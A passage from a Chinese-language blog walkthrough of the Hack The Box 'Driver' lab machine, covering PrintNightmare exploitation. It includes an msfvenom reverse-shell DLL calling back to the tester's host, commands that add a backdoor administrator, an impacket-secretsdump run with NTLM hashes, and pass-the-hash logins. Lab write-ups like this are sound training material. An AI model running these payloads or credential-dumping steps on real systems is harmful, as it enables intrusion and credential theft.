<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å†å²è®°å½•åœ¨æ­¤</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\programdata\apps&gt; <span class="built_in">gc</span></span><br><span class="line">C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleH</span><br><span class="line">ost_history.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">Add-Printer</span> <span class="literal">-PrinterName</span> <span class="string">&quot;RICOH_PCL6&quot;</span> <span class="literal">-DriverName</span> <span class="string">&#x27;RICOH PCL6 UniversalDriverV4.23&#x27;</span> <span class="literal">-PortName</span> <span class="string">&#x27;lpt1:&#x27;</span></span><br></pre></td></tr></table></figure>

<p>å’Œå‰ç«¯çœ‹åˆ°çš„ç±»ä¼¼ï¼Œ<strong>æœ‰å¾ˆå¤šæ‰“å°ç›¸å…³çš„å†…å®¹</strong></p>
<p>å‰å°ä»¥åŠåç«¯ä¼—å¤šæ‰“å°ã€æ‰“å°æœºç›¸å…³çš„ä¿¡æ¯ï¼Œæç¤ºæˆ‘ä»¬ï¼Œ<strong>å¯¹æ‰“å°æœåŠ¡å’Œç›¸å…³æ¼æ´è¦å…³æ³¨äº†</strong>ã€‚</p>
<p>è¿™æ˜¯nxcä¸­çš„å¯â½¤æ¨¡å—ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/aptlabs]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> nxc smb -L </span><br><span class="line">LOW PRIVILEGE MODULES</span><br><span class="line">[*] add-computer Adds or deletes a domain computer</span><br><span class="line">[*] dfscoerce Module to check <span class="keyword">if</span> the DC is vulnerable to</span><br><span class="line">DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam</span><br><span class="line">[*] drop-sc Drop a searchConnector-ms file on each writable</span><br><span class="line">share</span><br><span class="line">[*] enum_av Gathers information on all endpoint protection</span><br><span class="line">solutions installed on the the remote host(s) via LsarLookupNames (no</span><br><span class="line">privilege needed)</span><br><span class="line">[*] gpp_autologin Searches the domain controller <span class="keyword">for</span> registry.xml</span><br><span class="line">to find autologon information and returns the username and password.</span><br><span class="line">[*] gpp_password Retrieves the plaintext password and other</span><br><span class="line">information <span class="keyword">for</span> accounts pushed through Group Policy Preferences.</span><br><span class="line">[*] ioxidresolver This module helps you to identify hosts that</span><br><span class="line">have additional active interfaces</span><br><span class="line">[*] ms17-010 MS17-010 - EternalBlue - NOT TESTED OUTSIDE LAB</span><br><span class="line">ENVIRONMENT</span><br><span class="line">[*] nopac Check <span class="keyword">if</span> the DC is vulnerable to CVE-2021-42278</span><br><span class="line">and CVE-2021-42287 to impersonate DA from standard domain user</span><br><span class="line">[*] petitpotam Module to check <span class="keyword">if</span> the DC is vulnerable to</span><br><span class="line">PetitPotam, credit to @topotam</span><br><span class="line">[*] printnightmare Check <span class="keyword">if</span> host vulnerable to printnightmare</span><br><span class="line">[*] scuffy Creates and dumps an arbitrary .scf file with</span><br><span class="line">the icon property containing a UNC path to the declared SMB server against all</span><br><span class="line">writeable shares</span><br><span class="line">[*] shadowcoerce Module to check <span class="keyword">if</span> the target is vulnerable to</span><br><span class="line">ShadowCoerce, credit to @Shutdown and @topotam</span><br><span class="line">[*] slinky Creates windows shortcuts with the icon</span><br><span class="line">attribute containing a UNC path to the specified SMB server <span class="keyword">in</span> all shares with</span><br><span class="line">write permissions</span><br><span class="line">[*] spider_plus List files recursively and save a JSON sharefile metadata to the <span class="string">&#x27;OUTPUT_FOLDER&#x27;</span>. See module options <span class="keyword">for</span> finer</span><br><span class="line">configuration.</span><br><span class="line">[*] spooler Detect <span class="keyword">if</span> <span class="built_in">print</span> spooler is enabled or not</span><br><span class="line">[*] webdav Checks whether the WebClient service is running</span><br><span class="line">on the target</span><br><span class="line">[*] zerologon Module to check <span class="keyword">if</span> the DC is vulnerable to</span><br><span class="line">Zerologon aka CVE-2020-1472</span><br><span class="line">HIGH PRIVILEGE MODULES (requires admin privs)</span><br><span class="line">[*] bh_owned Set pwned computer as owned <span class="keyword">in</span> Bloodhound</span><br><span class="line">[*] empire_exec Uses Empire<span class="string">&#x27;s RESTful API to generate a launcher</span></span><br><span class="line"><span class="string">for the specified listener and executes it</span></span><br><span class="line"><span class="string">[*] enum_dns Uses WMI to dump DNS from an AD DNS Server</span></span><br><span class="line"><span class="string">[*] firefox Dump credentials from Firefox</span></span><br><span class="line"><span class="string">[*] get_netconnections Uses WMI to query network connections.</span></span><br><span class="line"><span class="string">[*] handlekatz Get lsass dump using handlekatz64 and parse the</span></span><br><span class="line"><span class="string">result with pypykatz</span></span><br><span class="line"><span class="string">[*] hash_spider Dump lsass recursively from a given hash using</span></span><br><span class="line"><span class="string">BH to find local admins</span></span><br><span class="line"><span class="string">[*] iis Checks for credentials in IIS Application Pool</span></span><br><span class="line"><span class="string">configuration files using appcmd.exe</span></span><br><span class="line"><span class="string">[*] impersonate List and impersonate tokens to run command as</span></span><br><span class="line"><span class="string">locally logged on users</span></span><br><span class="line"><span class="string">[*] install_elevated Checks for AlwaysInstallElevated</span></span><br><span class="line"><span class="string">[*] keepass_discover Search for KeePass-related files and process.</span></span><br><span class="line"><span class="string">[*] keepass_trigger Set up a malicious KeePass trigger to export the</span></span><br><span class="line"><span class="string">database in cleartext.</span></span><br><span class="line"><span class="string">[*] lsassy Dump lsass and parse the result remotely with</span></span><br><span class="line"><span class="string">lsassy</span></span><br><span class="line"><span class="string">[*] masky Remotely dump domain user credentials via an</span></span><br><span class="line"><span class="string">ADCS and a KDC</span></span><br><span class="line"><span class="string">[*] met_inject Downloads the Meterpreter stager and injects it</span></span><br><span class="line"><span class="string">into memory</span></span><br><span class="line"><span class="string">[*] msol Dump MSOL cleartext password from the localDB on</span></span><br><span class="line"><span class="string">the Azure AD-Connect Server</span></span><br><span class="line"><span class="string">[*] nanodump Get lsass dump using nanodump and parse the</span></span><br><span class="line"><span class="string">result with pypykatz</span></span><br><span class="line"><span class="string">[*] ntdsutil Dump NTDS with ntdsutil</span></span><br><span class="line"><span class="string">[*] ntlmv1 Detect if lmcompatibilitylevel on the target is</span></span><br><span class="line"><span class="string">set to 0 or 1</span></span><br><span class="line"><span class="string">[*] pi Run command as logged on users via Process</span></span><br><span class="line"><span class="string">Injection</span></span><br><span class="line"><span class="string">[*] procdump Get lsass dump using procdump64 and parse the</span></span><br><span class="line"><span class="string">result with pypykatz</span></span><br><span class="line"><span class="string">[*] rdcman Remotely dump Remote Desktop Connection Manager</span></span><br><span class="line"><span class="string">(sysinternals) credentials</span></span><br><span class="line"><span class="string">[*] rdp Enables/Disables RDP</span></span><br><span class="line"><span class="string">[*] reg-query Performs a registry query on the machine</span></span><br><span class="line"><span class="string">[*] runasppl Check if the registry value RunAsPPL is set or</span></span><br><span class="line"><span class="string">not</span></span><br><span class="line"><span class="string">[*] schtask_as Remotely execute a scheduled task as a logged on</span></span><br><span class="line"><span class="string">user</span></span><br><span class="line"><span class="string">[*] teams_localdb Retrieves the cleartext ssoauthcookie from the</span></span><br><span class="line"><span class="string">local Microsoft Teams database, if teams is open we kill all Teams process</span></span><br><span class="line"><span class="string">[*] test_connection Pings a host</span></span><br><span class="line"><span class="string">[*] uac Checks UAC status</span></span><br><span class="line"><span class="string">[*] veeam Extracts credentials from local Veeam SQL</span></span><br><span class="line"><span class="string">Database</span></span><br><span class="line"><span class="string">[*] wcc Check various security configuration items on</span></span><br><span class="line"><span class="string">Windows machines</span></span><br><span class="line"><span class="string">[*] wdigest Creates/Deletes the &#x27;</span>UseLogonCredential<span class="string">&#x27;</span></span><br><span class="line"><span class="string">registry key enabling WDigest cred dumping on Windows &gt;= 8.1</span></span><br><span class="line"><span class="string">[*] web_delivery Kicks off a Metasploit Payload using the</span></span><br><span class="line"><span class="string">exploit/multi/script/web_delivery module</span></span><br><span class="line"><span class="string">[*] wifi Get key of all wireless interfaces</span></span><br><span class="line"><span class="string">[*] winscp Looks for WinSCP.ini files in the registry and</span></span><br><span class="line"><span class="string">default locations and tries to extract credentials.</span></span><br></pre></td></tr></table></figure>



<h5 id="æŸ¥è¯¢ç›¸å…³èµ„æ–™ï¼š"><a href="#æŸ¥è¯¢ç›¸å…³èµ„æ–™ï¼š" class="headerlink" title="æŸ¥è¯¢ç›¸å…³èµ„æ–™ï¼š"></a>æŸ¥è¯¢ç›¸å…³èµ„æ–™ï¼š</h5><p><strong>Print Spooler</strong> æœåŠ¡æ˜¯ Windowsæ“ä½œç³»ç»Ÿä¸­â½¤äºç®¡ç†æ‰“å°ä»»åŠ¡çš„â¼€ä¸ªå…³é”®ç»„ä»¶ã€‚å®ƒä½¿â½¤æˆ·å¯ä»¥åœ¨åå°å¤„ç†æ‰“å°ä½œä¸šï¼Œä½¿å¾—æ‰“å°æœºå¯ä»¥æŒ‰ç…§é¡ºåºå¤„ç†å¤šä¸ªæ‰“å°ä»»åŠ¡ï¼ŒåŒæ—¶â½¤æˆ·å¯ä»¥ç»§ç»­æ‰§â¾å…¶ä»–æ“ä½œï¼Œâ½½ä¸å¿…ç­‰å¾…å½“å‰æ‰“å°ä½œä¸šå®Œæˆã€‚</p>
<p>å…ˆç¡®è®¤ä¸‹spoolerçš„æœåŠ¡çŠ¶æ€ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/aptlabs]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> nxc smb driver.htb -u tony -p liltony -M spooler </span><br><span class="line">SMB 10.129.220.192 445 DRIVER [*] Windows 10 Enterprise</span><br><span class="line">10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 10.129.220.192 445 DRIVER [+] DRIVER\tony:liltony </span><br><span class="line">SPOOLER 10.129.220.192 445 DRIVER Spooler service enabled</span><br></pre></td></tr></table></figure>

<p>Spooleræ˜¯æ¿€æ´»çš„ï¼Œæœç´¢ä¸éš¾å‘ç°å¦‚ä¸‹RCEå…³é”®è¯ï¼š</p>
<img src="/posts/23837ad8/1732297198359.png" class="" width="1732297198359">

<p>é‚£å°±æœ‰å¿…è¦è¿›â¼€æ­¥çœ‹æ˜¯å¦æœ‰PrintNightmareäº†ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/RedteamNotes/aptlabs]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> nxc smb driver.htb -u tony -p liltony -M spooler -M printnightmare</span><br><span class="line">SMB 10.129.220.192 445 DRIVER [*] Windows 10 Enterprise</span><br><span class="line">10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 10.129.220.192 445 DRIVER [+] DRIVER\tony:liltony </span><br><span class="line">SPOOLER 10.129.220.192 445 DRIVER Spooler service enabled</span><br><span class="line">PRINTNIG... 10.129.220.192 445 DRIVER Vulnerable, next step https://github.com/ly4k/PrintNightmare</span><br></pre></td></tr></table></figure>

<p>æ²¡é”™ï¼Œ<strong>Vulnerableï¼</strong>æœ‰PrintNightmareæ¼æ´ã€‚</p>
<p><strong>PrintNightmareæ‰“å°å™©æ¢¦</strong>ï¼Œæ˜¯æŒ‡â¼€ç³»åˆ—å½±å“ Windows æ‰“å°åå°å¤„ç†ç¨‹åºæœåŠ¡ï¼ˆPrint Spoolerï¼‰çš„è¿œç¨‹ä»£ç æ‰§â¾ï¼ˆRCEï¼‰å’Œæœ¬åœ°ææƒï¼ˆLPEï¼‰æ¼æ´ã€‚è¿™äº›æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡â½¹ç»œæˆ–æœ¬åœ°è®¿é—®æ‰§â¾ä»»æ„ä»£ç ï¼Œä»â½½å®Œå…¨æ§åˆ¶å—å½±å“çš„ç³»ç»Ÿã€‚PrintNightmare çš„ä¸»è¦æ¼æ´ç¼–å·åŒ…æ‹¬ <strong>CVE-2021-1675</strong> å’Œ <strong>CVE-2021-34527</strong>ã€‚</p>
<p>åˆ©â½¤â½…å¼nxcçš„æ ¡éªŒç»™é“¾æ¥äº†ï¼Œé‚£å°±ç›´æ¥çœ‹èƒ½ä¸èƒ½åˆ©â½¤ï¼š<code>https://github.com/ly4k/PrintNightmare</code></p>
<p>æ£€æµ‹â¼€ä¸‹æ˜¯å¦å¯åˆ©â½¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ ./printnightmare.py -check <span class="string">&#x27;tony:liltony@driver.htb&#x27;</span> </span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line">[*] Target appears to be vulnerable!</span><br></pre></td></tr></table></figure>



<p>æˆ‘ç›´æ¥ç»™å‡ºåˆ©ç”¨è¿‡ç¨‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">è¿›â¼€æ­¥ç¡®å®šï¼Œå¯ä»¥åˆ©â½¤ï¼Œä¿¡â¼¼ç»§ç»­å¢åŠ ã€‚æŒ‰ç…§printnightmare.pyå¸®åŠ©â½‚æ¡£çš„â½…æ³•ï¼Œå…ˆâ½£æˆåå¼¹shellçš„dllâ½‚ä»¶ï¼š</span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">â””â”€$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=9595 -f dll -o RedteamNotes.dll</span><br><span class="line"></span><br><span class="line">ä¸Šä¼ ï¼š</span><br><span class="line">*Evil-WinRM* PS C:\programdata\apps&gt; upload /home/kali/HackTheBox/Driver/RedteamNotes.dll</span><br><span class="line"></span><br><span class="line">åšå¥½9595ç«¯â¼çš„ncç›‘å¬ï¼Œç„¶åæ‰§â¾åˆ©â½¤,ä¹Ÿå¯ä»¥msfconsoleå¼€å¯ç›‘å¬ä¸€æ ·çš„ï¼š</span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">â””â”€$ ./printnightmare.py -dll &#x27;C:\programdata\apps\RedteamNotes.dll&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è™½ç„¶æŠ¥é”™äº†ä½†æ˜¯æˆåŠŸåå¼¹ï¼</span><br><span class="line">systemï¼ï¼ï¼</span><br></pre></td></tr></table></figure>

<h4 id="æŒä¹…åŒ–"><a href="#æŒä¹…åŒ–" class="headerlink" title="æŒä¹…åŒ–"></a>æŒä¹…åŒ–</h4><p>å¢åŠ â½¤æˆ·å‡­æ® test:20031216abcD ï¼š</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user test <span class="number">20031216</span>abcD /add</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> localgroup administrators test /add</span><br></pre></td></tr></table></figure>

<p>è½¬å‚¨secretsï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> impacket-secretsdump <span class="string">&#x27; test:20031216abcD&#x27;</span>@driver.htb </span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> kali: </span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Service RemoteRegistry is disabled, enabling it</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0xe5b3cda034afd685bc69ccd3c4e9387c</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>è½¬å‚¨åˆ°administratorçš„hashï¼Œç¡®è®¤â¼€ä¸‹ï¼šå“ˆå¸Œä¼ é€’</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/RedteamNotes/aptlabs]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> nxc winrm driver.htb -u Administrator -H d1256cff8b5b5fdb8c327d3b6c3f5017 -X <span class="string">&#x27;whoami;hostname;ipconfig;gci C:\Users *.txt -r;gci C:\Users *.txt -r | % &#123; gc $_.FullName &#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥è·å¾—æŒä¹…åŒ–çš„â½…å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> evil-winrm -i driver.htb -u Administrator -H d1256cff8b5b5fdb8c327d3b6c3f5017</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\Administrator\Documents&gt; whoami;hostname;ipconfig</span><br><span class="line">driver\administrator</span><br><span class="line">DRIVER</span><br><span class="line">Windows IP Configuration</span><br><span class="line">Ethernet adapter Ethernet0:</span><br><span class="line"> Connection<span class="literal">-specific</span> DNS Suffix . : .htb</span><br><span class="line"> IPv6 Address. . . . . . . . . . . : dead:beef::<span class="number">193</span></span><br><span class="line"> IPv6 Address. . . . . . . . . . . : dead:beef::<span class="number">3939</span>:b17c:cbe6:b12</span><br><span class="line"> Temporary IPv6 Address. . . . . . : dead:beef::b930:f85:d4b7:e7a3</span><br><span class="line"> Link<span class="literal">-local</span> IPv6 Address . . . . . : fe80::<span class="number">3939</span>:b17c:cbe6:b12%<span class="number">5</span></span><br><span class="line"> IPv4 Address. . . . . . . . . . . : <span class="number">10.129</span>.<span class="number">40.36</span></span><br><span class="line"> Subnet Mask . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">0.0</span></span><br><span class="line"> Default Gateway . . . . . . . . . : fe80::<span class="number">250</span>:<span class="number">56</span>ff:feb9:acf1%<span class="number">5</span></span><br><span class="line"> <span class="number">10.129</span>.<span class="number">0.1</span></span><br><span class="line">Tunnel adapter isatap..htb:</span><br><span class="line"> Media State . . . . . . . . . . . : Media disconnected</span><br><span class="line"> Connection<span class="literal">-specific</span> DNS Suffix . : .htb</span><br></pre></td></tr></table></figure>

<p>â¾„æ­¤ï¼Œå·²è·å¾—æœºå™¨çš„å®Œå…¨æ§åˆ¶æƒï¼ï¼ï¼ï¼ï¼ï¼ï¼</p>
<h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>nmapæ‰«æä¹‹åï¼Œå‘ç°smbâ½†è®¿é—®æƒé™ï¼Œ80ç«¯â¼éœ€è¦ç™»é™†ï¼Œå¼±å¯†ç æˆ–ç®€å•çˆ†ç ´ä¹‹åï¼Œçœ‹åˆ°æ‰“å°æœºå›ºä»¶æµ‹è¯•åŠŸèƒ½â»šâ¾¯ï¼Œwebæ¸—é€â½†æœï¼Œç»¼åˆåˆ†ææ”»å‡»â¾¯ï¼Œç¡®å®šå†…â½¹å—…æ¢çš„åŠæ³•ï¼Œåˆ©â½¤SCFâ½‚ä»¶äº§â½£æµé‡å’Œntlmv2è®¤è¯ï¼Œå—…æ¢åè·å¾—hashï¼Œç ´è§£åè·å¾—â½´â¾œç‚¹ï¼Œææƒâ½¤äº†Winpeasæšä¸¾ï¼Œä»¥åŠnxcéªŒè¯ï¼Œåˆ©â½¤PrintNightmareæ¼æ´è·å¾—äº†ç³»ç»Ÿæƒé™ ï¼Œç›²æ‰“çš„è¯ä¸ç®—ç‰¹åˆ«ç®€å•ï¼Œç›¸å¯¹æ¥è¯´æŠŠçŸ¥è¯†ç‚¹è¿›è¡Œäº†å„ç§æœ‰æœºç»“åˆå¾ˆå®ç”¨çš„ä¸€ä¸ªé¶æœºï¼</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="https://Iconabc.github.io">icon</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://iconabc.github.io/posts/23837ad8.html">https://iconabc.github.io/posts/23837ad8.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº <a href="https://Iconabc.github.io" target="_blank">icon'Blog</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">å†…ç½‘</a><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">é¶åœº</a><a class="post-meta__tags" href="/tags/HTB/">HTB</a></div><div class="post-share"><div class="social-share" data-image="/img/mbc.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/4f0d5716.html" title="Kerberos-è®¤è¯åŸç†"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">ä¸Šä¸€ç¯‡</div><div class="info-item-2">Kerberos-è®¤è¯åŸç†</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/posts/98ed62e4.html" title="vulntarget-ké¶åœº"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">ä¸‹ä¸€ç¯‡</div><div class="info-item-2">vulntarget-ké¶åœº</div></div><div class="info-2"><div class="info-item-1">vulntarget-kæ‰“é¶è®°å½•ï¼šæ­£å¼wpï¼šhttps://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg è´¦å·å¯†ç ä¿¡æ¯ï¼š    ä¸»æœº ä¸»æœºè´¦å·å¯†ç  webè´¦å·å¯†ç     xxl-job-admin xxl-job&#x2F;root123 admin&#x2F;Bolean@10000   nacos-springcloudgateway spring-nacos&#x2F;root123 nacos&#x2F;bolean@1q2   redis redis&#x2F;redis@1z rediså¯†ç ï¼šnbsg@123456   æ‹“æ‰‘å›¾ï¼š   æ€è·¯ï¼šå…¶ä¸­å¤–ç½‘IPæˆ‘è®¾ç½®æˆäº†ï¼š192.168.189.130 ç½‘ç»œé…ç½®æ–‡ä»¶ä¸ºï¼š/etc/netplan/00-installer-config.yaml 123456789101112131415161718network:  ethernets:    ens33:      addresses:      - 192.168.189.130/24      gateway4:...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/a9057879.html" title="vulntarget-hé¶åœº"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-14</div><div class="info-item-2">vulntarget-hé¶åœº</div></div><div class="info-2"><div class="info-item-1">vulntarget-h:ä¸ªäººçœ‹äº†wpåctfï¼Œæ‰“ä¸‹æ¥å°±æ€»ä½“æ¥è¯´ï¼ŒæŒºéš¾è¯„ï¼Œæˆ‘è®¤ä¸ºæ˜¯ä¸€ä¸ªæ€è½¯é¶åœºï¼ŒåŠ ä¸Šä¸€äº›æŠ€å·§æ€§çš„ctfé¢˜ï¼ æ€è·¯ï¼šç¬¬ä¸€æ­¥ä¿¡æ¯æ”¶é›†è¿‡ç¨‹ï¼Œç›´æ¥å¤–ç½‘å±•ç¤ºäº†ä¸€ä¸ªsql injection basicçš„å¤§å­—å°±å·®è´´è„¸å‘Šè¯‰ä½ è¿™æ˜¯sqlæ³¨å…¥çš„è€ƒç‚¹äº†ï¼Œå¹¶ä¸”ç»™å‡ºäº†æç¤º?user_id=....ç„¶åè¿™é‡Œé€šè¿‡æ‰‹æµ‹æ˜¯æœ‰ä¸€ä¸ªæ³¨å…¥ç‚¹çš„ã€‚  ç½‘ç«™æŒ‡çº¹ IISçš„ç¯å¢ƒ 